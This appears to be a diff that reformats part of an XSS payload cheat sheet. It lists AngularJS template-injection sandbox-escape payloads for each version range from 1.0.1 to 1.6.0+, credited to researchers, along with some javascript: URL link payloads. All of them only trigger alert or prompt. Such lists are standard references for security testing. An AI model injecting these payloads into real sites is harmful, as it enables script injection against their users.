@@ -62,33 +62,46 @@ javas&#x09;cript://www.google.com/%0Aalert(1)
 [a](javascript://www.google.com%0Aprompt(1))
 ```
 
-## AngularJS Template Injection based XSS
+**AngularJS Template Injection based XSS**
 
 **1.0.1 - 1.1.5** by [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)
-```
+
+```js
 {{constructor.constructor('alert(1)')()}}
 ```
+
 **1.2.0 - 1.2.1** by [Jan Horn (Google)](https://twitter.com/tehjh)
-```
+
+```js
 {{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
 ```
+
 **1.2.2 - 1.2.5** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)
-```
+
+```js
 {{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
 ```
+
 **1.2.6 - 1.2.18** by [Jan Horn (Google)](https://twitter.com/tehjh)
-```
+
+```js
 {{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
 ```
+
 **1.2.19 - 1.2.23** by [Mathias Karlsson](https://twitter.com/avlidienbrunn)
-```
+
+```js
 {{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
 ```
+
 **1.2.24 - 1.2.29** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)
-```
+
+```js
 {{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
 ```
+
 **1.3.0** by [Gábor Molnár (Google)](https://twitter.com/molnar_g)
+
 ```
 {{!ready && (ready = true) && (
       !call
@@ -105,42 +118,57 @@ javas&#x09;cript://www.google.com/%0Aalert(1)
         ))
     );}}
 ```
+
 **1.3.1 - 1.3.2** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)
-```
+
+```js
 {{
     {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
     'a'.constructor.prototype.charAt=''.valueOf; 
     $eval('x=alert(1)//'); 
 }}
 ```
+
 **1.3.3 - 1.3.18** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)
-```
+
+```js
 {{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 
 
   'a'.constructor.prototype.charAt=[].join;
   $eval('x=alert(1)//');  }}
 ```
+
 **1.3.19** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)
-```
+
+```js
 {{
     'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join; 
     $eval('x=alert(1)//'); 
 }}
+
 ```
+
 **1.3.20** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)
-```
+
+```js
 {{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
 ```
+
 **1.4.0 - 1.4.9** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)
-```
+
+```js
 {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
 ```
+
 **1.5.0 - 1.5.8** by [Ian Hickey](https://twitter.com/ianhickey1024)
-```
+
+```js
 {{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
 ```
+
 **1.5.9 - 1.5.11** by [Jan Horn (Google)](https://twitter.com/tehjh)
-```
+
+```js
 {{
     c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
     c.$apply=$apply;c.$eval=b;op=$root.$$phase;
@@ -156,7 +184,9 @@ javas&#x09;cript://www.google.com/%0Aalert(1)
     $eval('a(b.c)');[].push.apply=a;
 }}
 ```
+
 **1.6.0+** (no Sandbox) by [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)
-```
+
+```js
 {{constructor.constructor('alert(1)')()}}
 ```
